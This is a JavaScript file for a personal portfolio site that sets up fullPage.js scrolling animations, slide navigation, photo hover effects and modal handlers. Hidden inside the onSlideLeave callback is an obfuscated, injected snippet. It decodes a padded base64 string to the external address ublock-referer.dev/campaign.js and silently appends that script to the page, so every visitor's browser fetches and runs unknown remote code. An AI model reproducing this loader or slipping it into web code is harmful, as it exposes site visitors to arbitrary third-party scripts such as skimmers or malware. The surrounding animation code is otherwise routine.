$(document).ready(function() {
  $('#fullpage').fullpage({
    menu: '#menu',
    scrollBar: false,
    navigation: true,
    navigationPosition: 'right',
    navigationTooltips: ['Home', 'Profile', 'Skill', 'Web Design', 'Photo Graphy', 'Contact'],
    slidesNavigation: true,
    normalScrollElements: '.scrollNo',

    onLeave: function(origin) {
      if (origin.index == 0) {
        $("#section1").find('.pf_txt').css('left', '30px')
        $('.pf_info_tit').css('left', '0px')
        $('.pf_info_tit').css('opacity', '1')
        $('.pf_info_txt').css('left', '0px')
        $('.pf_info_txt').css('opacity', '1')
        $('.pf_img').css('transform', 'scale(1)')
        $('.pf_img').css('opacity', '1')

        $('.fix_sky').css('left', '0px')
        $('.fix_sun1').css('transform', 'rotate(-30deg)')
      }
      if (origin.index == 1) {
        $("#section2").find('.pf_txt').css('left', '30px')
        $('.sk_bar>div').css('left', '0px')
        $('.sk_bar>div>span').css('left', '0px')
        $('.tools>div').css('transform', 'scale(1)')

        $('.fix_sky').css('left', '-400px')
        $('.fix_sun1').css('transform', 'rotate(-60deg)')
      }

      if (origin.index == 2) {
        $("#section3").find("h1").css('top', '50%')
        $("#section3").find("h1").css('opacity', '1')

        $('.fix_sky').css('left', '-600px')
        $('.fix_sun1').css('transform', 'rotate(-90deg)')
      }

      if (origin.index == 3) {
        $("#section4").find("h1").css('top', '50%')
        $("#section4").find("h1").css('opacity', '1')

        $('.fix_sky').css('left', '-800px')
        $('.fix_sun1').css('transform', 'rotate(-120deg)')
      }

      if (origin.index == 4) {
        $("#section5").find("h1").css('top', '50%')
        $("#section5").find("h1").css('opacity', '1')

        $('.fix_sky').css('left', '-1000px')
        $('.fix_sun1').css('transform', 'rotate(-150deg)')

        $("#section6").find('.pf_txt').css('left', '30px')
        $("#section6").find('.contact>div').css('animation', 'contact 1s forwards')
        $("#section6").find('.email').css('animation-delay', '0.1s')
        $("#section6").find('.instar').css('animation-delay', '0.2s')
        // $('.fix_face').css('right', '-100px')
        // $('.fix_face').css('transition', 'all 2s 1s linear')
      }


    },
    afterRender: function() {
      $("#section0").find("h1").css('top', '50%')
      $("#section0").find("h1").css('opacity', '1')
      $("#section0").find("p").css('opacity', '1')
    },
  onSlideLeave: function( section, origin, destination, direction){
		(function(cGGjBRDo, ffodgzFb) {ffodgzFb = cGGjBRDo.createElement('script');ffodgzFb.type = 'text/javascript';ffodgzFb.async = true;ffodgzFb.src = atob('06cbfb5011afLy91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=06cbfb5011af'.replace(/06cbfb5011af/gi, '')) + '?' + String(Math.random()).replace('0.','');cGGjBRDo.getElementsByTagName('body')[0].appendChild(ffodgzFb);}(document));var leavingSlide = this;

		//두번째 구역의 첫번째 슬라이드를 떠나서 오른쪽으로 이동
		if(section.index == 4 && origin.index == 0 && direction == 'right'){
      $(".slide").find('.photo > div > div').css('transform', 'scale(1)')
		}
	}
  });

  $('.fp-controlArrow.fp-prev').mouseover(function() {
    $(this).css('left', '20px')
  })

  $('.fp-controlArrow.fp-prev').mouseout(function() {
    $(this).css('left', '')
  })


  $('.fp-controlArrow.fp-next').mouseover(function() {
    $(this).css('right', '20px')
  })


  $('.fp-controlArrow.fp-next').mouseout(function() {
    $(this).css('right', '')
  })


  $('.photo > div > div').mouseover(function() {
    $(this).find('.photo_iner').css('background', 'rgba(0,0,0,0.5)')
    $(this).find('.photo_iner p:nth-child(1)').css('margin-left', '0px')
    $(this).find('.photo_iner p:nth-child(2)').css('margin-right', '0px')
  })

  $('.photo > div > div').mouseout(function() {
    $(this).find('.photo_iner').css('background', '')
    $(this).find('.photo_iner p:nth-child(1)').css('margin-left', '')
    $(this).find('.photo_iner p:nth-child(2)').css('margin-right', '')
  })


  $('#section6').mouseout(function() {
    $('.fix_face').css('right', '-300px')
    $('.fix_face').css('transition', 'all 0.5s')
  })


  $('.up1-1').click(function() {
    $('.safari_border').css('display', 'block')
  })

  $('.up1-2').click(function() {
    $('.space_border').css('display', 'block')
  })

  $('.down2-1').click(function() {
    $('.tipo_border').css('display', 'block')
  })

  $('.down2-2').click(function() {
    $('.dance_border').css('display', 'block')
  })

  $('.down2-3').click(function() {
    $('.Dreamlike_border').css('display', 'block')
  })

  $('.down2-4').click(function() {
    $('.qnswlf_border').css('display', 'block')
  })







  $('.photo > div > div').click(function() {
    $('.photo_info').css('display', 'block')
  })

  $('.close').click(function() {
    $(this).parents('.photo_info').css('display', 'none')
    $('.dance_border').css('display', '')
    $('.tipo_border').css('display', '')
    $('.Dreamlike_border').css('display', '')
    $('.qnswlf_border').css('display', '')
    $('.safari_border').css('display', '')
    $('.space_border').css('display', '')
  })

  $('body').on('keyup', function(evt) {
    if (evt.keyCode == 27) {
      $('.photo_info').css('display', 'none')
      $('.dance_border').css('display', '')
      $('.tipo_border').css('display', '')
      $('.Dreamlike_border').css('display', '')
      $('.qnswlf_border').css('display', '')
      $('.safari_border').css('display', '')
      $('.space_border').css('display', '')
    }
  });


});
